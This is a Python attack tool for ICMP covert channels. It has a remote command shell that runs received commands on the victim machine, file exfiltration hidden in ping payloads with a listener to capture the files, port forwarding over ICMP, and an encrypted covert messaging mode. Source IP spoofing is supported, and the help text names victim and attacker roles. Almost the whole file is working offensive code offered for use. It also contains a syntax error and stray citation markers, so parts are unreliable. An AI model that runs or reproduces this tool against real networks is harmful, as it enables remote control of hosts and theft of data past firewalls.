#!/usr/bin/env python3
"""
ICMP Tunneling Network Attacks Tool
A comprehensive utility for creating covert channels using ICMP protocol.
Supports data exfiltration, command execution, reverse shells, and file transfer
through ICMP echo request/reply packets, bypassing traditional firewalls.
"""

import argparse
import sys
import os
import time
import threading
import logging
import socket
import struct
import select
import subprocess
import platform
import base64
import hashlib
import json
from datetime import datetime
from typing import List, Dict, Optional, Tuple, Union, Callable
from collections import defaultdict
import signal
import queue
import ipaddress

# Try importing scapy with fallback message
try:
    from scapy.all import *
    from scapy.layers.inet import IP, ICMP
    from scapy.layers.l2 import Ether
    from scapy.sendrecv import send, sr1, sniff
    from scapy.error import Scapy_Exception
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Optional imports for enhanced functionality
try:
    from colorama import init, Fore, Style
    COLORAMA_AVAILABLE = True
    init()  # Initialize colorama for Windows support
except ImportError:
    COLORAMA_AVAILABLE = False

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

try:
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False


class ICMPShell:
    """
    ICMP Reverse Shell Implementation
    Uses ICMP echo requests/replies to create a command shell
    Inspired by icmpsh and icmpdoor tools [citation:1][citation:4]
    """
    
    def __init__(self, target_ip: str, source_ip: str = None,
                 timeout: int = 5, verbose: bool = False,
                 packet_size: int = 64, encryption: bool = False,
                 key: str = None):
        """
        Initialize ICMP shell
        
        Args:
            target_ip: Target machine IP (victim for server, attacker for client)
            source_ip: Source IP for spoofing (optional)
            timeout: Packet timeout in seconds
            verbose: Enable verbose output
            packet_size: ICMP packet size
            encryption: Enable AES encryption
            key: Encryption key (if encryption enabled)
        """
        if not SCAPY_AVAILABLE:
            raise ImportError(
                "scapy module is required. Install with: pip install scapy"
            )
        
        self.target_ip = target_ip
        self.source_ip = source_ip
        self.timeout = timeout
        self.verbose = verbose
        self.packet_size = packet_size
        self.encryption = encryption
        self.key = key
        
        # Generate encryption key if not provided
        if self.encryption and not self.key:
            self.key = hashlib.sha256(b"icmp_tunnel_key").digest()
        elif self.encryption and self.key:
            self.key = hashlib.sha256(self.key.encode()).digest()
        
        # Statistics
        self.stats = {
            'packets_sent': 0,
            'packets_received': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'commands_executed': 0,
            'start_time': None
        }
        
        self.running = False
        self.lock = threading.Lock()
        
        # Setup logging
        self.setup_logging()
        
        # Disable ICMP replies if running as server
        self.disable_icmp_replies()
    
    def setup_logging(self):
        """Configure logging with optional colors"""
        self.logger = logging.getLogger('ICMPShell')
        self.logger.handlers.clear()
        
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - '
                f'{Fore.YELLOW}%(levelname)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter(
                '%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%H:%M:%S'
            )
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def disable_icmp_replies(self):
        """Disable kernel ICMP replies to prevent interference"""
        try:
            if platform.system() == "Linux":
                # Disable ICMP echo replies [citation:1][citation:6]
                os.system("sysctl -w net.ipv4.icmp_echo_ignore_all=1 >/dev/null 2>&1")
                self.logger.info("[+] Kernel ICMP replies disabled")
        except Exception as e:
            self.logger.debug(f"Could not disable ICMP replies: {e}")
    
    def enable_icmp_replies(self):
        """Re-enable kernel ICMP replies"""
        try:
            if platform.system() == "Linux":
                os.system("sysctl -w net.ipv4.icmp_echo_ignore_all=0 >/dev/null 2>&1")
                self.logger.info("[+] Kernel ICMP replies enabled")
        except Exception as e:
            self.logger.debug(f"Could not enable ICMP replies: {e}")
    
    def encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data using AES-CBC"""
        if not self.encryption or not CRYPTO_AVAILABLE:
            return data
        
        try:
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            padded_data = pad(data, AES.block_size)
            encrypted = cipher.encrypt(padded_data)
            return iv + encrypted
        except Exception as e:
            self.logger.debug(f"Encryption error: {e}")
            return data
    
    def decrypt_data(self, data: bytes) -> bytes:
        """Decrypt data using AES-CBC"""
        if not self.encryption or not CRYPTO_AVAILABLE:
            return data
        
        try:
            iv = data[:16]
            encrypted = data[16:]
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted)
            return unpad(decrypted, AES.block_size)
        except Exception as e:
            self.logger.debug(f"Decryption error: {e}")
            return data
    
    def create_icmp_packet(self, seq: int, data: bytes, id: int = None) -> Packet:
        """
        Create ICMP echo request packet
        
        Args:
            seq: Sequence number
            data: Payload data
            id: ICMP ID (default: random)
        
        Returns:
            ICMP packet
        """
        if id is None:
            id = os.getpid() & 0xFFFF
        
        # Encrypt data if enabled
        payload = self.encrypt_data(data)
        
        # Pad to packet size
        if len(payload) < self.packet_size - 28:  # IP + ICMP header
            payload = payload + b'\x00' * (self.packet_size - 28 - len(payload))
        
        # Create packet
        if self.source_ip:
            ip = IP(src=self.source_ip, dst=self.target_ip)
        else:
            ip = IP(dst=self.target_ip)
        
        icmp = ICMP(type=8, code=0, id=id, seq=seq)
        
        return ip/icmp/payload
    
    def send_command(self, command: str) -> Optional[str]:
        """
        Send command through ICMP tunnel
        
        Args:
            command: Command to execute
        
        Returns:
            Command output or None
        """
        # Send command
        cmd_data = command.encode('utf-8', errors='ignore')
        packet = self.create_icmp_packet(1, cmd_data)
        
        try:
            # Send command and wait for response
            response = sr1(packet, timeout=self.timeout, verbose=0)
            
            with self.lock:
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                self.stats['commands_executed'] += 1
            
            if response and response.haslayer(ICMP) and response[ICMP].type == 0:
                # Extract payload
                payload = bytes(response[ICMP].payload)
                
                # Decrypt if needed
                if self.encryption:
                    payload = self.decrypt_data(payload)
                
                # Remove padding
                payload = payload.rstrip(b'\x00')
                
                with self.lock:
                    self.stats['packets_received'] += 1
                    self.stats['bytes_received'] += len(payload)
                
                return payload.decode('utf-8', errors='ignore')
            
        except Exception as e:
            self.logger.debug(f"Command send error: {e}")
        
        return None
    
    def execute_command(self, command: str) -> str:
        """
        Execute system command
        
        Args:
            command: Command to execute
        
        Returns:
            Command output
        """
        try:
            # Handle cd command specially
            if command.startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    return f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    return f"Error: {e}"
            
            # Execute command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            output = result.stdout + result.stderr
            return output if output else "Command executed successfully"
            
        except subprocess.TimeoutExpired:
            return "Command timed out"
        except Exception as e:
            return f"Error: {e}"
    
    def server_mode(self):
        """
        Run in server mode (victim) - waits for commands
        """
        self.logger.info(f"[*] Starting ICMP shell server on {self.target_ip}")
        self.logger.info("[*] Waiting for commands...")
        
        self.running = True
        self.stats['start_time'] = time.time()
        
        def packet_handler(packet):
            if packet.haslayer(ICMP) and packet[ICMP].type == 8:  # Echo request
                # Extract command
                payload = bytes(packet[ICMP].payload)
                
                # Decrypt if needed
                if self.encryption:
                    try:
                        payload = self.decrypt_data(payload)
                    except Exception:
                        pass
                
                # Remove padding
                payload = payload.rstrip(b'\x00')
                
                try:
                    command = payload.decode('utf-8', errors='ignore')
                    
                    if self.verbose:
                        self.logger.info(f"[*] Received command: {command}")
                    
                    # Execute command
                    output = self.execute_command(command)
                    
                    # Send response
                    response_data = output.encode('utf-8', errors='ignore')
                    response_packet = self.create_icmp_packet(
                        packet[ICMP].seq,
                        response_data,
                        packet[ICMP].id
                    )
                    
                    send(response_packet, verbose=0)
                    
                    with self.lock:
                        self.stats['packets_received'] += 1
                        self.stats['packets_sent'] += 1
                        self.stats['bytes_received'] += len(packet)
                        self.stats['bytes_sent'] += len(response_packet)
                        
                except Exception as e:
                    self.logger.debug(f"Command handling error: {e}")
        
        try:
            sniff(filter="icmp", prn=packet_handler, store=0, stop_filter=lambda x: not self.running)
        except Exception as e:
            self.logger.error(f"Server error: {e}")
        finally:
            self.enable_icmp_replies()
    
    def client_mode(self):
        """
        Run in client mode (attacker) - sends commands
        """
        self.logger.info(f"[*] Starting ICMP shell client targeting {self.target_ip}")
        self.logger.info("[*] Type 'exit' to quit, 'help' for commands")
        
        self.stats['start_time'] = time.time()
        
        try:
            while True:
                # Get command input
                command = input(f"\n{Fore.GREEN if COLORAMA_AVAILABLE else ''}ICMP> {Style.RESET_ALL if COLORAMA_AVAILABLE else ''}")
                
                if command.lower() == 'exit':
                    break
                elif command.lower() == 'help':
                    print("\nCommands:")
                    print("  help        - Show this help")
                    print("  exit        - Exit shell")
                    print("  stats       - Show statistics")
                    print("  upload <file> - Upload file")
                    print("  download <file> - Download file")
                    print("  Any other command is executed on target\n")
                    continue
                elif command.lower() == 'stats':
                    self.show_stats()
                    continue
                elif command.startswith('upload '):
                    self.upload_file(command[7:])
                    continue
                elif command.startswith('download '):
                    self.download_file(command[9:])
                    continue
                
                # Send command and get output
                output = self.send_command(command)
                
                if output:
                    print(output)
                else:
                    print("[-] No response from target")
        
        except KeyboardInterrupt:
            self.logger.info("\n[!] Interrupted")
        finally:
            self.show_stats()
    
    def upload_file(self, local_path: str):
        """
        Upload file to target
        
        Args:
            local_path: Local file path
        """
        try:
            # Read file
            with open(local_path, 'rb') as f:
                file_data = f.read()
            
            # Encode as base64
            encoded = base64.b64encode(file_data).decode('utf-8')
            
            # Send upload command with file content
            filename = os.path.basename(local_path)
            command = f"__UPLOAD__:{filename}:{encoded}"
            
            output = self.send_command(command)
            print(output or "[+] File uploaded")
            
        except Exception as e:
            print(f"[-] Upload failed: {e}")
    
    def download_file(self, remote_path: str):
        """
        Download file from target
        
        Args:
            remote_path: Remote file path
        """
        command = f"__DOWNLOAD__:{remote_path}"
        output = self.send_command(command)
        
        if output and output.startswith("__FILE__:"):
            try:
                # Parse response
                _, filename, encoded = output.split(':', 2)
                file_data = base64.b64decode(encoded)
                
                # Save file
                with open(filename, 'wb') as f:
                    f.write(file_data)
                
                print(f"[+] File downloaded as: {filename}")
                
            except Exception as e:
                print(f"[-] Download failed: {e}")
        else:
            print("[-] Download failed or file not found")
    
    def show_stats(self):
        """Display statistics"""
        elapsed = time.time() - self.stats['start_time'] if self.stats['start_time'] else 0
        
        print(f"\n{'='*50}")
        print(f"ICMP Shell Statistics")
        print(f"{'='*50}")
        print(f"Duration: {elapsed:.2f} seconds")
        print(f"Packets sent: {self.stats['packets_sent']}")
        print(f"Packets received: {self.stats['packets_received']}")
        print(f"Bytes sent: {self.stats['bytes_sent']}")
        print(f"Bytes received: {self.stats['bytes_received']}")
        print(f"Commands executed: {self.stats['commands_executed']}")
        print(f"{'='=50}\n")


class ICMPExfiltration:
    """
    ICMP Data Exfiltration Tool
    Uses ICMP payload to exfiltrate files/data stealthily [citation:2][citation:5]
    """
    
    def __init__(self, target_ip: str, listener_ip: str = None,
                 packet_size: int = 1200, delay: float = 0.1,
                 verbose: bool = False):
        """
        Initialize ICMP exfiltration tool
        
        Args:
            target_ip: Target IP for sending data
            listener_ip: Listener IP for capturing data
            packet_size: Maximum payload size per packet
            delay: Delay between packets
            verbose: Enable verbose output
        """
        if not SCAPY_AVAILABLE:
            raise ImportError("scapy module is required")
        
        self.target_ip = target_ip
        self.listener_ip = listener_ip
        self.packet_size = packet_size
        self.delay = delay
        self.verbose = verbose
        
        self.stats = {
            'packets_sent': 0,
            'packets_received': 0,
            'bytes_sent': 0,
            'bytes_received': 0
        }
        
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging"""
        self.logger = logging.getLogger('ICMPExfil')
        self.logger.handlers.clear()
        
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S')
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def exfiltrate_file(self, file_path: str, chunk_size: int = None):
        """
        Exfiltrate file through ICMP packets
        
        Args:
            file_path: Path to file
            chunk_size: Chunk size (default: packet_size - 100)
        """
        if chunk_size is None:
            chunk_size = self.packet_size - 100  # Reserve space for headers
        
        try:
            # Read and encode file
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            # Base64 encode for safe transmission
            encoded = base64.b64encode(file_data).decode('ascii')
            total_chunks = (len(encoded) + chunk_size - 1) // chunk_size
            
            self.logger.info(f"[*] Exfiltrating {file_path} ({len(file_data)} bytes)")
            self.logger.info(f"[*] Total chunks: {total_chunks}")
            
            # Create progress bar
            if TQDM_AVAILABLE:
                pbar = tqdm(total=total_chunks, desc="Exfiltrating", unit="chunks")
            
            filename = os.path.basename(file_path)
            
            for i in range(total_chunks):
                start = i * chunk_size
                end = min(start + chunk_size, len(encoded))
                chunk = encoded[start:end]
                
                # Create metadata header
                header = f"{i:04d}:{total_chunks:04d}:{filename}:"
                payload = (header + chunk).encode('utf-8')
                
                # Send ICMP packet
                packet = IP(dst=self.target_ip)/ICMP(type=8)/Raw(load=payload)
                send(packet, verbose=0)
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
                if TQDM_AVAILABLE:
                    pbar.update(1)
                
                time.sleep(self.delay)
            
            if TQDM_AVAILABLE:
                pbar.close()
            
            self.logger.info(f"[+] File exfiltration complete: {self.stats['packets_sent']} packets")
            
        except Exception as e:
            self.logger.error(f"[-] Exfiltration failed: {e}")
    
    def start_listener(self, output_dir: str = "."):
        """
        Start listener to capture exfiltrated files
        
        Args:
            output_dir: Directory to save captured files
        """
        self.logger.info(f"[*] Starting ICMP exfiltration listener on {self.listener_ip}")
        
        os.makedirs(output_dir, exist_ok=True)
        
        # Dictionary to store chunks per file
        file_chunks = defaultdict(dict)
        file_info = {}
        
        def packet_handler(packet):
            if packet.haslayer(ICMP) and packet.haslayer(Raw):
                try:
                    payload = packet[Raw].load.decode('utf-8')
                    
                    # Parse header
                    if ':' in payload[:20]:
                        parts = payload.split(':', 4)
                        if len(parts) >= 4:
                            chunk_num = int(parts[0])
                            total_chunks = int(parts[1])
                            filename = parts[2]
                            data = parts[3]
                            
                            # Store chunk
                            file_chunks[filename][chunk_num] = data
                            file_info[filename] = total_chunks
                            
                            self.stats['packets_received'] += 1
                            self.stats['bytes_received'] += len(packet)
                            
                            # Check if file complete
                            if len(file_chunks[filename]) == total_chunks:
                                self.assemble_file(filename, file_chunks[filename], output_dir)
                                
                except Exception as e:
                    if self.verbose:
                        self.logger.debug(f"Packet parse error: {e}")
        
        try:
            sniff(filter="icmp", prn=packet_handler, store=0)
        except KeyboardInterrupt:
            self.logger.info("\n[*] Stopping listener")
            
            # Assemble any incomplete files
            for filename, chunks in file_chunks.items():
                if len(chunks) > 0:
                    self.logger.warning(f"[!] Incomplete file: {filename} ({len(chunks)}/{file_info[filename]} chunks)")
    
    def assemble_file(self, filename: str, chunks: Dict[int, str], output_dir: str):
        """
        Assemble file from chunks
        
        Args:
            filename: Original filename
            chunks: Dictionary of chunks
            output_dir: Output directory
        """
        try:
            # Sort chunks by number
            sorted_chunks = [chunks[i] for i in sorted(chunks.keys())]
            
            # Combine and decode
            encoded_data = ''.join(sorted_chunks)
            file_data = base64.b64decode(encoded_data)
            
            # Save file
            output_path = os.path.join(output_dir, f"captured_{filename}")
            with open(output_path, 'wb') as f:
                f.write(file_data)
            
            self.logger.info(f"[+] File reconstructed: {output_path} ({len(file_data)} bytes)")
            
        except Exception as e:
            self.logger.error(f"[-] File assembly failed: {e}")


class ICMPTunnel:
    """
    Generic ICMP Tunnel for bidirectional communication
    Can encapsulate any TCP/UDP traffic
    """
    
    def __init__(self, server_ip: str, client_ip: str = None,
                 port: int = 8080, verbose: bool = False):
        """
        Initialize ICMP tunnel
        
        Args:
            server_ip: Server IP
            client_ip: Client IP (for client mode)
            port: Local port to forward
            verbose: Enable verbose output
        """
        self.server_ip = server_ip
        self.client_ip = client_ip
        self.port = port
        self.verbose = verbose
        
        self.running = False
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging"""
        self.logger = logging.getLogger('ICMPTunnel')
        self.logger.handlers.clear()
        
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.CYAN}%(asctime)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S')
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def server_mode(self):
        """
        Run in server mode (receives tunneled traffic)
        """
        self.logger.info(f"[*] Starting ICMP tunnel server on {self.server_ip}")
        self.logger.info(f"[*] Forwarding to localhost:{self.port}")
        
        self.running = True
        
        def packet_handler(packet):
            if packet.haslayer(ICMP) and packet.haslayer(Raw):
                try:
                    # Extract tunneled data
                    payload = bytes(packet[Raw].load)
                    
                    # Forward to local service
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect(('127.0.0.1', self.port))
                    sock.send(payload)
                    
                    # Get response
                    response = sock.recv(4096)
                    sock.close()
                    
                    # Send back via ICMP
                    response_packet = IP(dst=packet[IP].src)/ICMP(type=0)/Raw(load=response)
                    send(response_packet, verbose=0)
                    
                    if self.verbose:
                        self.logger.debug(f"Tunneled {len(payload)} bytes -> {len(response)} bytes")
                        
                except Exception as e:
                    self.logger.debug(f"Tunnel error: {e}")
        
        try:
            sniff(filter="icmp", prn=packet_handler, store=0)
        except KeyboardInterrupt:
            self.logger.info("\n[*] Stopping tunnel server")
    
    def client_mode(self):
        """
        Run in client mode (sends tunneled traffic)
        """
        self.logger.info(f"[*] Starting ICMP tunnel client to {self.server_ip}")
        self.logger.info(f"[*] Local port {self.port} will be forwarded")
        
        # Create local server
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('0.0.0.0', self.port))
        server.listen(5)
        
        self.logger.info(f"[*] Listening on 0.0.0.0:{self.port}")
        
        try:
            while True:
                client, addr = server.accept()
                self.logger.info(f"[+] Connection from {addr[0]}:{addr[1]}")
                
                # Handle client in new thread
                thread = threading.Thread(target=self.handle_client, args=(client,))
                thread.daemon = True
                thread.start()
                
        except KeyboardInterrupt:
            self.logger.info("\n[*] Stopping tunnel client")
            server.close()
    
    def handle_client(self, client_socket: socket.socket):
        """
        Handle client connection
        
        Args:
            client_socket: Client socket
        """
        while True:
            try:
                # Receive data from client
                data = client_socket.recv(4096)
                if not data:
                    break
                
                # Send via ICMP
                packet = IP(dst=self.server_ip)/ICMP(type=8)/Raw(load=data)
                response = sr1(packet, timeout=5, verbose=0)
                
                if response and response.haslayer(Raw):
                    # Send response back to client
                    client_socket.send(bytes(response[Raw].load))
                    
            except Exception as e:
                self.logger.debug(f"Client handler error: {e}")
                break
        
        client_socket.close()


class ICMPBreach:
    """
    Advanced ICMP covert channel with encryption
    Based on ICMPBreach concept [citation:8]
    """
    
    def __init__(self, target_ip: str, key: str = None, verbose: bool = False):
        """
        Initialize ICMP breach channel
        
        Args:
            target_ip: Target IP
            key: Encryption key
            verbose: Enable verbose output
        """
        self.target_ip = target_ip
        self.verbose = verbose
        self.key = key or hashlib.sha256(b"icmp_breach").digest()
        
        self.setup_logging()
    
    def setup_logging(self):
        """Configure logging"""
        self.logger = logging.getLogger('ICMPBreach')
        self.logger.handlers.clear()
        
        handler = logging.StreamHandler()
        
        if COLORAMA_AVAILABLE:
            formatter = logging.Formatter(
                f'{Fore.MAGENTA}%(asctime)s{Style.RESET_ALL} - %(message)s',
                datefmt='%H:%M:%S'
            )
        else:
            formatter = logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S')
        
        handler.setFormatter(formatter)
        self.logger.addHandler(handler)
        self.logger.setLevel(logging.DEBUG if self.verbose else logging.INFO)
    
    def send_covert_message(self, message: str):
        """
        Send encrypted covert message
        
        Args:
            message: Message to send
        """
        try:
            # Encrypt message
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            padded = pad(message.encode(), AES.block_size)
            encrypted = cipher.encrypt(padded)
            
            # Add magic bytes and IV
            payload = b"ICMP" + iv + encrypted
            
            # Send via ICMP
            packet = IP(dst=self.target_ip)/ICMP(type=8)/Raw(load=payload)
            send(packet, verbose=0)
            
            self.logger.info(f"[+] Covert message sent ({len(payload)} bytes)")
            
        except Exception as e:
            self.logger.error(f"[-] Failed to send message: {e}")
    
    def listen_covert(self):
        """Listen for covert messages"""
        self.logger.info("[*] Listening for covert ICMP messages...")
        
        def packet_handler(packet):
            if packet.haslayer(ICMP) and packet.haslayer(Raw):
                payload = bytes(packet[Raw].load)
                
                # Check for magic bytes
                if payload.startswith(b"ICMP"):
                    try:
                        # Extract IV and encrypted data
                        iv = payload[4:20]
                        encrypted = payload[20:]
                        
                        # Decrypt
                        cipher = AES.new(self.key, AES.MODE_CBC, iv)
                        decrypted = cipher.decrypt(encrypted)
                        message = unpad(decrypted, AES.block_size).decode()
                        
                        self.logger.info(f"[+] Covert message received: {message}")
                        
                    except Exception as e:
                        self.logger.debug(f"Decryption failed: {e}")
        
        try:
            sniff(filter="icmp", prn=packet_handler, store=0)
        except KeyboardInterrupt:
            self.logger.info("\n[*] Stopping listener")


def banner():
    """Display tool banner"""
    banner_text = f"""
{'='*60}
    ICMP Tunneling Network Attacks Tool
    For authorized security testing and education only
    Modules: Shell, Exfiltration, Tunnel, Covert Channel
{'='*60}
    """
    if COLORAMA_AVAILABLE:
        print(f"{Fore.RED}{banner_text}{Style.RESET_ALL}")
    else:
        print(banner_text)


def main():
    """Main function for command-line interface"""
    parser = argparse.ArgumentParser(
        description='ICMP Tunneling Network Attacks Tool - Covert communication via ICMP',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # ICMP Reverse Shell (Server - Victim)
  sudo python3 icmp_tunnel.py shell --mode server --target 192.168.1.100
  
  # ICMP Reverse Shell (Client - Attacker)
  sudo python3 icmp_tunnel.py shell --mode client --target 192.168.1.100
  
  # File Exfiltration
  sudo python3 icmp_tunnel.py exfil --mode send --target 192.168.1.100 --file secret.txt
  
  # File Capture (Listener)
  sudo python3 icmp_tunnel.py exfil --mode listen --listener 192.168.1.100 --output ./captured
  
  # ICMP Tunnel (Port Forwarding) - Server
  sudo python3 icmp_tunnel.py tunnel --mode server --server 192.168.1.100 --port 8080
  
  # ICMP Tunnel (Port Forwarding) - Client
  sudo python3 icmp_tunnel.py tunnel --mode client --server 192.168.1.100 --port 8080
  
  # Covert Message with Encryption
  sudo python3 icmp_tunnel.py breach --mode send --target 192.168.1.100 --message "Top Secret"
  
  # Listen for Covert Messages
  sudo python3 icmp_tunnel.py breach --mode listen --target 192.168.1.100
  
  # Encrypted Shell
  sudo python3 icmp_tunnel.py shell --mode client --target 192.168.1.100 --encrypt --key "secret123"
        """
    )
    
    parser.add_argument('--debug', action='store_true', help='Enable debug output')
    
    subparsers = parser.add_subparsers(dest='module', help='Module to use')
    
    # Shell module
    shell_parser = subparsers.add_parser('shell', help='ICMP reverse shell')
    shell_parser.add_argument('--mode', choices=['server', 'client'], required=True,
                             help='Server (victim) or Client (attacker)')
    shell_parser.add_argument('--target', required=True, help='Target IP address')
    shell_parser.add_argument('--source', help='Source IP for spoofing')
    shell_parser.add_argument('--packet-size', type=int, default=64, help='Packet size')
    shell_parser.add_argument('--encrypt', action='store_true', help='Enable encryption')
    shell_parser.add_argument('--key', help='Encryption key')
    shell_parser.add_argument('--timeout', type=int, default=5, help='Packet timeout')
    
    # Exfiltration module
    exfil_parser = subparsers.add_parser('exfil', help='ICMP data exfiltration')
    exfil_parser.add_argument('--mode', choices=['send', 'listen'], required=True,
                             help='Send or listen mode')
    exfil_parser.add_argument('--target', help='Target IP for sending')
    exfil_parser.add_argument('--listener', help='Listener IP for capture')
    exfil_parser.add_argument('--file', help='File to exfiltrate')
    exfil_parser.add_argument('--output', default='.', help='Output directory')
    exfil_parser.add_argument('--packet-size', type=int, default=1200, help='Packet size')
    exfil_parser.add_argument('--delay', type=float, default=0.1, help='Delay between packets')
    
    # Tunnel module
    tunnel_parser = subparsers.add_parser('tunnel', help='ICMP port forwarding tunnel')
    tunnel_parser.add_argument('--mode', choices=['server', 'client'], required=True)
    tunnel_parser.add_argument('--server', required=True, help='Server IP')
    tunnel_parser.add_argument('--client', help='Client IP (for client mode)')
    tunnel_parser.add_argument('--port', type=int, default=8080, help='Local port')
    
    # Breach module (covert channel)
    breach_parser = subparsers.add_parser('breach', help='ICMP covert channel')
    breach_parser.add_argument('--mode', choices=['send', 'listen'], required=True)
    breach_parser.add_argument('--target', required=True, help='Target IP')
    breach_parser.add_argument('--message', help='Message to send')
    breach_parser.add_argument('--key', help='Encryption key')
    
    # Global options
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    # Display banner
    banner()
    
    # Check if scapy is available
    if not SCAPY_AVAILABLE:
        print("[!] scapy module is required. Install with: pip install scapy")
        print("    On Debian/Ubuntu: sudo apt install python3-scapy")
        sys.exit(1)
    
    # Check for root privileges
    if os.geteuid() != 0:
        print("[!] This script requires root privileges for raw socket access")
        print("    Please run with: sudo python3 icmp_tunnel.py [options]")
        sys.exit(1)
    
    try:
        # Execute selected module
        if args.module == 'shell':
            shell = ICMPShell(
                target_ip=args.target,
                source_ip=args.source,
                packet_size=args.packet_size,
                verbose=args.verbose,
                encryption=args.encrypt,
                key=args.key
            )
            
            if args.mode == 'server':
                shell.server_mode()
            else:
                shell.client_mode()
        
        elif args.module == 'exfil':
            exfil = ICMPExfiltration(
                target_ip=args.target,
                listener_ip=args.listener,
                packet_size=args.packet_size,
                delay=args.delay,
                verbose=args.verbose
            )
            
            if args.mode == 'send':
                if not args.file:
                    print("[-] --file required for send mode")
                    sys.exit(1)
                exfil.exfiltrate_file(args.file)
            else:
                exfil.start_listener(args.output)
        
        elif args.module == 'tunnel':
            tunnel = ICMPTunnel(
                server_ip=args.server,
                client_ip=args.client,
                port=args.port,
                verbose=args.verbose
            )
            
            if args.mode == 'server':
                tunnel.server_mode()
            else:
                tunnel.client_mode()
        
        elif args.module == 'breach':
            breach = ICMPBreach(
                target_ip=args.target,
                key=args.key,
                verbose=args.verbose
            )
            
            if args.mode == 'send':
                if not args.message:
                    print("[-] --message required for send mode")
                    sys.exit(1)
                breach.send_covert_message(args.message)
            else:
                breach.listen_covert()
        
        else:
            parser.print_help()
            sys.exit(1)
            
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error: {e}")
        if args.debug:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
